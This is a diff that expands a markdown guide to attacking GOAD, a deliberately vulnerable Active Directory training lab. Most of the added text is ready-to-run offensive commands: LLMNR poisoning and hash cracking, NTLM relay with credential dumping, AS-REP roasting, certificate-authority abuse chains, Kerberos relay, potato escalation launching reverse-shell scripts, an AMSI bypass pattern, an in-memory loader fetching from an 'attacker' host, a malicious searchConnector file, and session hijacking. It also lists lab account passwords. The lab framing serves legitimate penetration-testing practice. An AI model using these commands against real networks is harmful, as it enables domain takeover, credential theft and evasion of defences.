@@ -8,6 +8,25 @@
 - Multiple servers including Domain Controllers, IIS, MSSQL, and ADCS servers
 - Forest trusts between domains
 
+**GOAD Lab-Specific Vulnerable Configurations:**
+These scheduled tasks and configurations are provisioned by Ansible roles to enable attack scenarios:
+
+| Configuration | Server | User | Frequency | Ansible Role | Attack Enabled |
+|---------------|--------|------|-----------|--------------|----------------|
+| Non-existent share connection | Winterfell | robb.stark | Every 1 minute | `roles/vulns/responder` | LLMNR/NBT-NS Poisoning |
+| Non-existent share connection | Kingslanding | eddard.stark (Domain Admin) | Every 5 minutes | `roles/vulns/ntlm_relay` | NTLM Relay |
+| AS-REP Roastable account | - | brandon.stark | - | Account settings | AS-REP Roasting |
+| SMB Signing disabled | Winterfell | - | - | Server config | NTLM Relay target |
+| IIS upload vulnerability | 192.168.56.22 | - | - | IIS config | Web shell upload |
+
+**Key Vulnerable Accounts:**
+- **robb.stark** - Local admin on Winterfell, password in rockyou.txt (NetNTLMv2 capture)
+- **brandon.stark** - AS-REP roastable, password: `iseedeadpeople`
+- **eddard.stark** - Domain Admin, enables NTLM relay to domain compromise
+- **samwell.tarly** - Password in description field: `Heartsbane`
+- **hodor** - Password equals username: `hodor`
+- **jon.snow** - Kerberoastable, password: `iknownothing`
+
 ---
 
 ## Table of Contents
@@ -104,12 +123,24 @@
 
 ### LLMNR/mDNS/NBT-NS Poisoning
 **Vulnerability:** Broadcast name resolution protocols enabled
+- **GOAD Context:** Winterfell runs scheduled task as robb.stark every minute, attempting to connect to a non-existent share (configured in `roles/vulns/responder`)
 - **Tool:** Responder
-- **Captured Credentials:** robb.stark (NetNTLMv2 hash)
+- **Captured Credentials:** robb.stark (NetNTLMv2 hash, crackable with rockyou.txt)
 - **Exploitation:**
   ```bash
+  # Start Responder on lab network interface
   responder -I eth0 -wrf
+
+  # Wait up to 1 minute for robb.stark's scheduled task
+  # Capture NetNTLMv2 hash
+
+  # Crack with hashcat
+  hashcat -m 5600 robb_stark_hash.txt rockyou.txt
+
+  # Or with John
+  john robb_stark_hash.txt --wordlist=rockyou.txt
   ```
+- **Result:** robb.stark is local admin on Winterfell - enables further lateral movement
 - **Impact:** Credential capture from network authentication
 
 ### NTLMv1 Downgrade Attack
@@ -119,12 +150,33 @@
 
 ### NTLM Relay to SMB
 **Vulnerability:** Unsigned SMB on workstations
+- **GOAD Context:** Kingslanding runs scheduled task as eddard.stark (Domain Admin) every 5 minutes connecting to non-existent share. Winterfell has SMB signing disabled.
+- **Find Unsigned SMB Hosts:**
+  ```bash
+  cme smb 192.168.56.0/24 --gen-relay-list relay_targets.txt
+  ```
 - **Attack Chain:**
-  1. Poison LLMNR/NBT-NS requests
-  2. Relay captured authentication to unsigned SMB hosts
-  3. Gain admin access via ntlmrelayx
-- **Targets:** castelblack, braavos
-- **Tools:** ntlmrelayx, smbexec
+  1. Disable Responder's SMB/HTTP servers in `/usr/share/responder/Responder.conf`
+  2. Start Responder to poison LLMNR/NBT-NS: `responder -I eth0 -v`
+  3. Relay captured authentication to unsigned SMB hosts
+- **Basic Relay (single command):**
+  ```bash
+  impacket-ntlmrelayx -t 192.168.56.11 -smb2support -c "whoami"
+  ```
+- **SOCKS Proxy Relay (persistent access):**
+  ```bash
+  # Start relay with SOCKS
+  impacket-ntlmrelayx -t 192.168.56.11 -smb2support -socks
+
+  # In ntlmrelayx console, type 'socks' to see active sessions
+  # Use proxychains with any tool
+  proxychains cme smb 192.168.56.11 -d 'SEVENKINGDOMS' -u 'eddard.stark' -p '' --sam
+  proxychains secretsdump.py 'SEVENKINGDOMS/eddard.stark'@192.168.56.11
+  proxychains lsassy -d SEVENKINGDOMS -u eddard.stark -p '' 192.168.56.11
+  ```
+- **Proxychains Config:** Edit `/etc/proxychains4.conf` - change port to 1080 (ntlmrelayx default) instead of 9050 (Tor default)
+- **Targets:** Winterfell (SMB signing disabled)
+- **Tools:** ntlmrelayx, Responder, proxychains, secretsdump, lsassy
 
 ### NTLM Relay to LDAPS
 **Vulnerability:** LDAP signing not enforced + RBCD misconfiguration
@@ -157,13 +209,25 @@
 **Vulnerability:** Users with "Do not require Kerberos preauthentication" flag
 - **Affected Accounts:** brandon.stark
 - **Cracked Password:** iseedeadpeople
-- **Tools:** GetNPUsers.py, hashcat (mode 18200)
+- **Discovery Methods:**
+  - **PowerView:** `Get-DomainUser -PreauthNotRequired -Properties distinguishedname`
+  - **AD Module:** `Get-ADuser -filter * -properties DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq "True"}`
+  - **Impacket:** `GetNPUsers.py domain/ -usersfile users.txt -dc-ip DC_IP`
 - **Exploitation:**
   ```bash
+  # Linux - Impacket
   GetNPUsers.py north.sevenkingdoms.local/ -usersfile users.txt -dc-ip 192.168.56.11
+  GetNPUsers.py north.sevenkingdoms.local/brandon.stark -dc-ip 192.168.56.11 -no-pass -format hashcat
+
+  # Windows - Rubeus (auto-discovers AS-REP roastable accounts)
+  Rubeus.exe asreproast /format:hashcat
+
+  # Crack the hash
   hashcat -m 18200 asrep_hashes.txt wordlist.txt
+  john asrep_hashes.txt --wordlist=rockyou.txt
   ```
 - **Note:** Does not increase badpwdcount (no lockout risk)
+- **Offensive Tip:** With GenericWrite/GenericAll on a user, you can enable "Do not require Kerberos preauthentication" via userAccountControl modification, then AS-REP roast them
 
 ### Kerberoasting
 **Vulnerability:** Service accounts with SPNs set
@@ -237,19 +301,33 @@
   certipy req -u user@domain -p password -ca CA-NAME -template TEMPLATE -upn admin@domain
   ```
 
-### ESC5 - Golden Certificate
-**Vulnerability:** Compromise of Certificate Authority server
-- **Requirements:** CA server compromise
+### ESC5 - Golden Certificate & PKI Object Access Control
+**Vulnerability:** Compromise of Certificate Authority server or PKI AD objects
+
+**Golden Certificate Attack:**
+- **Requirements:** CA server compromise (local admin on CA)
 - **Attack Paths:**
   - **SCHANNEL:** Extract CA cert/key → forge certificate → LDAP shell
   - **PKINIT:** Extract CA cert/key → forge certificate → Kerberos authentication
 - **Tools:** Certipy, SharpDPAPI
 - **Exploitation:**
   ```bash
+  # Backup CA certificate and private key
   certipy ca -backup -u user@domain -p password -ca CA-NAME
+
+  # Forge administrator certificate
   certipy forge -ca-pfx ca.pfx -upn administrator@domain -subject 'CN=Administrator'
+
+  # Authenticate using forged certificate
+  certipy auth -pfx forged.pfx -dc-ip DC_IP
   ```
 - **Impact:** Forge certificates for any user, persistent domain compromise
+
+**PKI Object Access Control:**
+- **Vulnerability:** Excessive permissions on PKI container objects in AD
+- **Scenario:** If SYSTEM (or compromised principal) has Full Control on parent domain's Public Key Services Container
+- **Attack Path:** Child domain compromise → modify CA objects in parent domain → escalate to parent domain
+- **Impact:** Cross-domain privilege escalation via ADCS infrastructure
 
 ### ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2
 **Vulnerability:** CA configured with `EDITF_ATTRIBUTESUBJECTALTNAME2` flag
@@ -258,13 +336,34 @@
 - **Exploitation:** Request certificate with `-upn` flag for any template
 
 ### ESC7 - ManageCA/ManageCertificate Abuse
-**Vulnerability:** ManageCA privileges can be escalated
+**Vulnerability:** ManageCA privileges can be escalated to issue arbitrary certificates
+- **Requirements:** ManageCA privileges on Certificate Authority
 - **Attack Chain:**
-  1. Use ManageCA to grant ManageCertificate permissions
-  2. Enable restricted templates
-  3. Issue failed certificate requests
-  4. Create subordinate CA certificates
-- **Impact:** Domain compromise through certificate issuance
+  1. Add yourself as officer (ManageCertificates permission):
+     ```bash
+     certipy ca -ca 'CA-NAME' -add-officer attacker -u user@domain -p password
+     ```
+  2. Enable vulnerable template (e.g., SubCA):
+     ```bash
+     certipy ca -ca 'CA-NAME' -enable-template SubCA -u user@domain -p password
+     ```
+  3. Request certificate with forged UPN (will be pending):
+     ```bash
+     certipy req -u user@domain -p password -ca CA-NAME -template SubCA -upn administrator@domain
+     ```
+  4. Issue the pending request using your officer privileges:
+     ```bash
+     certipy ca -ca 'CA-NAME' -issue-request REQUEST_ID -u user@domain -p password
+     ```
+  5. Retrieve the issued certificate:
+     ```bash
+     certipy req -u user@domain -p password -ca CA-NAME -retrieve REQUEST_ID
+     ```
+  6. Authenticate as administrator:
+     ```bash
+     certipy auth -pfx administrator.pfx -dc-ip DC_IP
+     ```
+- **Impact:** Domain compromise through arbitrary certificate issuance
 
 ### ESC8 - NTLM Relay to AD CS HTTP Endpoints
 **Vulnerability:** Web enrollment service accepts NTLM authentication without EPA/signing
@@ -281,46 +380,129 @@
   ```
 - **Variant:** Kerberos relay with self-coercion via DNS manipulation
 
-### ESC9 - UPN Spoofing with Shadow Credentials
-**Vulnerability:** CT_FLAG_NO_SECURITY_EXTENSION + GenericWrite on user
+### ESC9 - UPN Spoofing with No Security Extension
+**Vulnerability:** Certificate template with `CT_FLAG_NO_SECURITY_EXTENSION` (0x00080000) flag
+- **Prerequisites:**
+  - GenericWrite on target account
+  - `msPKI-EnrollmentFlag` contains `CT_FLAG_NO_SECURITY_EXTENSION`
+  - `StrongCertificateBindingEnforcement=1` or `CertificateMappingMethods=0x04`
 - **Attack Chain:**
-  1. Identify user with GenericWrite access
-  2. Modify target user's UPN temporarily
-  3. Request certificate with spoofed UPN
-  4. Revert UPN changes
-  5. Authenticate as privileged user
+  1. Add shadow credentials to target to obtain their hash:
+     ```bash
+     certipy shadow auto -u attacker@domain -p password -account target
+     ```
+  2. Modify target's UPN to administrator:
+     ```bash
+     # Using bloodyAD or similar
+     bloodyAD -u attacker -p password -d domain set object target userPrincipalName -v administrator@domain
+     ```
+  3. Request certificate using target's credentials:
+     ```bash
+     certipy req -u target@domain -hashes :HASH -ca CA-NAME -template VulnerableTemplate
+     ```
+  4. Restore original UPN
+  5. Authenticate with forged certificate
 - **Impact:** Privilege escalation via certificate-based authentication
 
 ### ESC10 - Weak Certificate Mapping
-**Vulnerability:** Certificate mapping bypass
-- **Case 1:** StrongCertificateBindingEnforcement disabled
-- **Case 2:** CertificateMappingMethods set to 0x04 (UPN mapping)
+**Vulnerability:** Certificate mapping bypass allowing authentication as any user
+- **Case 1 (StrongCertificateBindingEnforcement=0):**
+  1. Modify target user's UPN to "administrator"
+  2. Request certificate using target's hash
+  3. Restore original UPN
+  4. Authenticate as administrator with certificate
+- **Case 2 (CertificateMappingMethods=0x04):**
+  1. Modify target UPN to computer account format: `computername$@domain`
+  2. Request certificate
+  3. Restore UPN
+  4. Authenticate via LDAP shell for computer account access
 - **Requirements:** GenericWrite on target account
-- **Exploitation:** Similar to ESC9, modify UPN and request certificate
+- **Tools:** certipy, bloodyAD
 
 ### ESC11 - RPC Encryption Weakness
-**Vulnerability:** Encryption not enforced for ICPR requests
-- **Configuration:** Request Disposition set to Issue
-- **Attack:** RPC-based relay instead of HTTP
-- **Exploitation:** Similar to ESC8 using RPC endpoint
+**Vulnerability:** Encryption not enforced for ICPR (MS-ICPR) RPC requests
+- **Difference from ESC8:** Uses RPC instead of HTTP for relay
+- **Requirements:** CA allows RPC connections without encryption enforcement
+- **Attack Chain:**
+  1. Set up RPC relay:
+     ```bash
+     ntlmrelayx.py -t rpc://CA-IP -rpc-mode ICPR -icpr-ca-name CA-NAME --adcs
+     ```
+  2. Coerce DC authentication via RPC:
+     ```bash
+     coercer.py -u user -p password -d domain -t DC-IP -l attacker-ip --rpc-mode
+     ```
+  3. Certificate issued for coerced principal
+  4. Authenticate using obtained certificate
+- **Impact:** Domain compromise via RPC-based relay (bypasses HTTP-focused defenses)
 
-### ESC13 - Group Membership Escalation
-**Vulnerability:** Certificate templates allowing enrollment for privileged groups
-- **Requirements:** Template permits universal group enrollment
-- **Impact:** Certificate request grants group memberships persisting after authentication
+### ESC13 - Group Membership via Issuance Policy
+**Vulnerability:** Certificate template with issuance policy linked to privileged group membership
+- **Scenario:** Template allows domain users to enroll, and the issued certificate grants membership in a privileged group (e.g., "greatmaster" → admin privileges)
+- **Detection:** Identify templates where enrollment grants extended rights or group memberships
+- **Attack Chain:**
+  1. Enumerate templates with dangerous issuance policies:
+     ```bash
+     certipy find -vulnerable -u user@domain -p password
+     ```
+  2. Request certificate from vulnerable template:
+     ```bash
+     certipy req -u user@domain -p password -ca CA-NAME -template VulnerableTemplate
+     ```
+  3. Authenticate and inherit group privileges:
+     ```bash
+     certipy auth -pfx user.pfx -dc-ip DC_IP
+     ```
+- **Impact:** Unintended privilege escalation through certificate issuance policies
 
 ### ESC14 - AltSecurityIdentities Manipulation
-**Vulnerability:** GenericWrite/Modify on user's AltSecurityIdentities attribute
+**Vulnerability:** Write access to target's `altSecurityIdentities` attribute enables certificate mapping
+- **Requirements:** GenericWrite/WriteDacl on target user object
 - **Attack Chain:**
-  1. Create machine account with specific DNS/SPN
-  2. Map certificate to target user via X509IssuerSerialNumber
-  3. Authenticate as target user
-- **Impact:** Account takeover via certificate mapping
+  1. Create machine account with specific DNS hostname:
+     ```bash
+     addcomputer.py -computer-name 'YOURPC$' -computer-pass 'Pass123' domain/user:password
+     # Set dnsHostName for the computer account
+     ```
+  2. Request Machine template certificate for your computer:
+     ```bash
+     certipy req -u 'YOURPC$'@domain -p 'Pass123' -ca CA-NAME -template Machine
+     ```
+  3. Calculate X509IssuerSerialNumber from certificate:
+     ```bash
+     openssl x509 -in cert.pem -noout -issuer -serial
+     # Format: X509:<I>DC=domain,DC=local,CN=CA-NAME<SR>SERIALNUMBER
+     ```
+  4. Modify target's altSecurityIdentities attribute:
+     ```bash
+     # Using ldeep or similar LDAP tool
+     ldeep ldap -u user -p password -d domain modify "CN=target,CN=Users,DC=domain,DC=local" \
+       add altSecurityIdentities "X509:<I>DC=domain,DC=local,CN=CA-NAME<SR>SERIAL"
+     ```
+  5. Authenticate as target using your certificate via PKINIT:
+     ```bash
+     certipy auth -pfx yourpc.pfx -dc-ip DC_IP -domain domain.local
+     ```
+- **Impact:** Account takeover via certificate mapping without password knowledge
 
 ### ESC15 (CVE-2024-49019) - Certificate Request Agent Abuse
-**Vulnerability:** Certificate request agent application policy exploitation
-- **Attack:** Request certificates on behalf of other users via delegation
-- **Impact:** Privilege escalation to domain admin
+**Vulnerability:** Certificate Request Agent application policy enables delegation abuse
+- **Requirements:** Access to template with "Certificate Request Agent" EKU/application policy
+- **Attack Chain:**
+  1. Request certificate with Certificate Request Agent policy:
+     ```bash
+     certipy req -u user@domain -p password -ca CA-NAME -template AgentTemplate
+     ```
+  2. Use agent certificate to request certificate on behalf of administrator:
+     ```bash
+     certipy req -u user@domain -p password -ca CA-NAME -template User \
+       -on-behalf-of 'domain\\administrator' -pfx agent.pfx
+     ```
+  3. Authenticate as administrator:
+     ```bash
+     certipy auth -pfx administrator.pfx -dc-ip DC_IP
+     ```
+- **Impact:** Privilege escalation to any user including domain admin
 - **Patched:** November 12, 2024
 
 ### Certifried (CVE-2022-26923)
@@ -590,47 +772,124 @@ Tywin
 
 ### SeImpersonatePrivilege Exploitation
 **Vulnerability:** Service accounts (IIS, MSSQL) have SeImpersonate privilege by default
-- **Tools:** PrintSpoofer, SweetPotato, BadPotato, JuicyPotato, RoguePotato
-- **Exploitation:**
-  ```powershell
-  PrintSpoofer.exe -i -c cmd
-  ```
-- **Impact:** Escalation to SYSTEM privileges
+- **Tools:** PrintSpoofer, SweetPotato, BadPotato, JuicyPotato, RoguePotato, GodPotato
+- **Exploitation Techniques:**
+  - **PrintSpoofer:** Abuses the Print Spooler service to impersonate SYSTEM
+    ```powershell
+    PrintSpoofer.exe -i -c cmd
+    PrintSpoofer.exe -c "C:\path\to\reverse_shell.bat"
+    ```
+  - **SweetPotato:** Unified "potato" technique that defaults to PrintSpoofer
+    - Creates temporary directory and loads binary via `Assembly.Load()` into PowerShell
+    - Executes batch file containing reverse shell commands
+    ```powershell
+    # In-memory loading via PowerSharpPack
+    Invoke-SweetPotato -Command "C:\temp\shell.bat"
+    ```
+  - **BadPotato:** Alternative when other potatoes are detected
+    - Requires AMSI bypass before execution due to Defender detection
+    - Can be loaded via PowerSharpPack wrapper
+    ```powershell
+    # AMSI bypass required first
+    Invoke-BadPotato -Command "cmd /c whoami"
+    ```
+- **Common Trigger:** Web shells on IIS provide initial SeImpersonate context
+- **Impact:** Escalation from service account (IIS AppPool, SQL Service) to SYSTEM privileges
 
 ### KrbRelayUp
 **Vulnerability:** Kerberos relay when LDAP signing not enforced
-- **Requirements:**
-  - LDAP signing not enforced
-  - Machine account creation permissions (MAQ)
+- **Requirements Verification:**
+  - **LDAP Signing:** Check with CME module: `cme ldap DC_IP -u user -p pass -M ldap-signing`
+  - **Machine Account Quota (MAQ):** `cme ldap DC_IP -u user -p pass -M maq` (default: 10)
 - **Attack Chain:**
-  1. Create machine account
-  2. Configure RBCD via Kerberos relay
-  3. Impersonate admin
-- **Tools:** KrbRelayUp, KrbRelay
-- **Impact:** System-level privilege escalation
+  1. **Add Computer Account:**
+     ```bash
+     addcomputer.py -computer-name 'YOURPC$' -computer-pass 'Password123' domain/user:password
+     ```
+  2. **Extract Machine Account SID:**
+     ```bash
+     pywerview get-netcomputer -u user -p password -d domain --computername YOURPC
+     ```
+  3. **Launch KrbRelay with CLSID:**
+     ```bash
+     # Target LDAP service with specific CLSID
+     KrbRelay.exe -spn ldap/DC.domain.local -clsid {CLSID} -rbcd YOURPC$
+     ```
+  4. **Configure RBCD:** KrbRelay automatically sets `msDS-AllowedToActOnBehalfOfOtherIdentity`
+  5. **Request Impersonated Ticket:**
+     ```bash
+     # Using Impacket
+     getST.py -spn cifs/target.domain.local -impersonate administrator domain/'YOURPC$':'Password123'
+
+     # Using Rubeus (Windows)
+     Rubeus.exe hash /password:Password123 /user:YOURPC$ /domain:domain.local
+     Rubeus.exe s4u /user:YOURPC$ /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target /ptt
+     ```
+  6. **Execute Commands:**
+     ```bash
+     wmiexec.py -k -no-pass domain/administrator@target.domain.local
+     ```
+- **Tools:** KrbRelayUp (all-in-one), KrbRelay, Rubeus, Impacket
+- **Defender Note:** KrbRelay may evade Defender detection (as of writeup date)
+- **Impact:** System-level privilege escalation from local service account
 
 ### AMSI Bypass
-**Vulnerability:** PowerShell AMSI can be bypassed
-- **Techniques:**
-  - Modified reflection methods
-  - String concatenation in bypass payloads
-  - Obfuscation techniques
-- **Impact:** Execute malicious PowerShell without AV detection
+**Vulnerability:** PowerShell AMSI can be bypassed using multi-stage techniques
+- **Two-Stage Approach:**
+  1. **PowerShell Level:** Modified reflection methods with string fragmentation to avoid signature detection
+     - Fragment known signatures: `"Am'+'siUt'+'ils"` instead of `"AmsiUtils"`
+     - Use reflection to access internal .NET methods
+  2. **.NET Level:** Patch amsi.dll's `AmsiScanBuffer` function using kernel32 API calls
+     - Use `GetProcAddress` to locate the function
+     - Modify memory protection with `VirtualProtect`
+     - Patch the function to return clean scan results
+- **Common Bypass Patterns:**
+  ```powershell
+  # Example string fragmentation pattern
+  $a = 'Sy'+'st'+'em.Ma'+'nag'+'ement.Aut'+'omtic'+'on.Am'+'siUt'+'ils'
+  ```
+- **Impact:** Execute malicious PowerShell and load .NET assemblies without AV detection
+- **Note:** Modern EDR may still detect behavioral patterns even with AMSI bypass
 
 ### In-Memory Execution
 **Vulnerability:** Lack of EDR/AV monitoring of .NET assembly loading
-- **Method:** Load assemblies directly into memory without disk writes
-- **Tools:** PowerSharpPack, Invoke-SharpLoader
-- **Impact:** Defense evasion
+- **Philosophy:** "The disk is lava" - avoid writing files to disk to evade file-based detection
+- **Method:** Load .NET assemblies directly into memory using `Assembly.Load()` or reflection
+- **Tools & Techniques:**
+  - **PowerSharpPack:** Pre-compiled .NET tools wrapped with public class/method interfaces for easy PowerShell invocation
+  - **Invoke-SharpLoader:** Generic loader for .NET assemblies
+  - **WinPEAS:** Enumeration tool loaded entirely in memory via `Assembly.Load()` from HTTP-served payloads
+- **Example Loading Pattern:**
+  ```powershell
+  # Download and load assembly in memory
+  $bytes = (New-Object Net.WebClient).DownloadData('http://attacker/tool.exe')
+  [System.Reflection.Assembly]::Load($bytes)
+  [Namespace.Class]::Method()
+  ```
+- **CheckPort.exe:** Verify available ports for reverse shells before exploitation
+- **Impact:** Defense evasion - bypasses file-based AV/EDR detection
 
 ### Web Shell Upload
 **Vulnerability:** IIS application with file upload functionality
-- **Example:** Simple ASP.NET application allowing unrestricted uploads
+- **Target in GOAD:** 192.168.56.22 (IIS server with vulnerable upload functionality)
+- **Example:** Simple ASP.NET application allowing unrestricted file uploads without extension validation
 - **Exploitation:**
-  1. Upload ASPX web shell
-  2. Access web shell via browser
-  3. Execute commands as IIS user
-- **Impact:** Initial access, code execution
+  1. Upload ASPX web shell via vulnerable upload form
+     ```
+     # Common web shells: cmd.aspx, simple-backdoor.aspx
+     ```
+  2. Access web shell via browser at uploaded path
+     ```
+     http://192.168.56.22/uploads/shell.aspx
+     ```
+  3. Execute commands as IIS AppPool identity (has SeImpersonate)
+  4. Chain with potato exploits for SYSTEM
+- **Post-Upload Attack Path:**
+  1. Verify privileges: `whoami /priv` (look for SeImpersonatePrivilege)
+  2. Bypass AMSI if using PowerShell
+  3. Load exploitation tools in memory
+  4. Execute SweetPotato/PrintSpoofer for SYSTEM
+- **Impact:** Initial access → SeImpersonate → SYSTEM privileges
 
 ### SCMUACBypass
 **Vulnerability:** UAC bypass techniques
@@ -845,29 +1104,79 @@ Tywin
 - **Impact:** Authentication callback for hash capture
 
 ### WebDAV-Based Coercion
-**Vulnerability:** WebClient service can be triggered to start
-- **Method:** Upload `.searchConnector-ms` files to shares
+**Vulnerability:** WebClient service can be triggered to start, enabling HTTP-based authentication
+- **Method:** Upload `.searchConnector-ms` files to accessible shares
+- **searchConnector-ms File Structure:**
+  ```xml
+  <?xml version="1.0" encoding="UTF-8"?>
+  <searchConnectorDescription>
+    <iconReference>\\attacker-ip@80\webdav\icon.ico</iconReference>
+    <description>Search</description>
+    <isSearchOnlyItem>false</isSearchOnlyItem>
+    <includeInStartMenuScope>true</includeInStartMenuScope>
+    <templateInfo>
+      <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
+    </templateInfo>
+    <simpleLocation>
+      <url>\\attacker-ip@80\webdav</url>
+    </simpleLocation>
+  </searchConnectorDescription>
+  ```
 - **Attack Chain:**
-  1. Force WebClient service to start
-  2. Trigger HTTP-based authentication
-  3. Relay to LDAP (LDAPS)
-- **Requirements:** WebClient service installed (workstations)
-- **Impact:** LDAP relay attacks
+  1. Drop `.searchConnector-ms` file on accessible share
+  2. When user browses the share, WebClient service starts
+  3. HTTP-based authentication triggered (bypasses SMB signing requirements)
+  4. Relay to LDAPS for shadow credentials or RBCD attacks
+- **Requirements:**
+  - WebClient service installed (workstations, not servers by default)
+  - User must browse the share containing the malicious file
+- **LDAP Relay (if signing not enforced):**
+  - Add shadow credentials → PKINIT authentication
+  - Configure RBCD → impersonate admin
+- **Impact:** HTTP-to-LDAP relay enables domain compromise on workstations
 
 ### Token Impersonation
-**Vulnerability:** Available tokens on compromised systems
-- **Method:** Execute commands under different user contexts
-- **Tools:** incognito, Invoke-TokenManipulation
-- **Impact:** Privilege escalation without credential access
+**Vulnerability:** Available tokens on compromised systems can be leveraged
+- **Method:** Leverage user tokens to execute commands as other users without credentials
+- **Token Types:**
+  - **Delegation tokens:** Created for interactive logins (RDP, console)
+  - **Impersonation tokens:** Created for non-interactive sessions
+- **Tools:** incognito (Meterpreter), Invoke-TokenManipulation, TokenDuplicator
+- **Exploitation Flow:**
+  ```powershell
+  # List available tokens
+  Invoke-TokenManipulation -Enumerate
+
+  # Impersonate specific user token
+  Invoke-TokenManipulation -ImpersonateUser -Username "DOMAIN\admin"
+
+  # Execute command with impersonated token
+  Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "DOMAIN\admin"
+  ```
+- **Requirements:** Requires SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
+- **Impact:** Execute commands as other logged-in users without their credentials
 
 ### RDP Session Hijacking
 **Vulnerability:** Administrator can redirect active RDP sessions (Server 2016)
-- **Method:** `tscon.exe` commands to take over sessions
+- **Method:** Use `tscon.exe` to redirect active sessions to attacker's session
 - **Requirements:**
-  - Administrator privileges
+  - SYSTEM privileges (use `Psexec64.exe -s cmd.exe` to elevate)
   - Active RDP session exists
   - Vulnerable OS version (primarily Server 2016)
-- **Impact:** Assume control of another user's desktop session
+- **Exploitation:**
+  ```cmd
+  # Enumerate active sessions
+  query user
+
+  # Example output:
+  #  USERNAME              SESSIONNAME        ID  STATE
+  #  administrator         rdp-tcp#1           2  Active
+  #  victim_user           rdp-tcp#0           1  Active
+
+  # Hijack victim's session (run from SYSTEM context)
+  tscon.exe 1 /dest:rdp-tcp#1
+  ```
+- **Impact:** Take over another user's active desktop session without credentials
 
 ---
 
@@ -1100,6 +1409,22 @@ GOAD (Game of Active Directory) is an exceptionally comprehensive vulnerable Act
 
 The lab is actively maintained and updated with new attack techniques as they are discovered. It provides an excellent training environment for security professionals to practice Active Directory penetration testing in a safe, legal, and comprehensive manner.
 
-This document represents the most thorough compilation of GOAD vulnerabilities available, synthesized from official writeups, community contributions, and detailed exploitation guides.
+This document represents the most thorough compilation of GOAD vulnerabilities available, synthesized from official writeups (Parts 1-14 by Mayfly277), community contributions, and detailed exploitation guides.
 
-**Last Updated:** December 2024
+**Coverage Summary:**
+- Part 1: Reconnaissance and scanning
+- Part 2: User discovery (ASREPRoast, password spraying)
+- Part 3: Authenticated enumeration (BloodHound, Kerberoasting)
+- Part 4: Poisoning and relay (Responder, NTLM relay, MITM6)
+- Part 5: CVE exploitation (noPac, PrintNightmare)
+- Part 6: ADCS attacks (ESC1-8, Certifried, Shadow Credentials)
+- Part 7: MSSQL exploitation (impersonation, linked servers)
+- Part 8: Privilege escalation (SeImpersonate, KrbRelayUp, AMSI bypass, in-memory execution)
+- Part 9: Lateral movement (PTH, PTT, credential extraction)
+- Part 10: Delegation attacks (unconstrained, constrained, RBCD)
+- Part 11: ACL abuse (ForceChangePassword, GenericWrite, GPO abuse)
+- Part 12: Trust exploitation (child-to-parent, forest trusts, golden ticket + ExtraSid)
+- Part 13: Post-exploitation (token impersonation, RDP hijacking, file coercion)
+- Part 14: Advanced ADCS (ESC5/7/9/10/11/13/14/15)
+
+**Last Updated:** March 2026
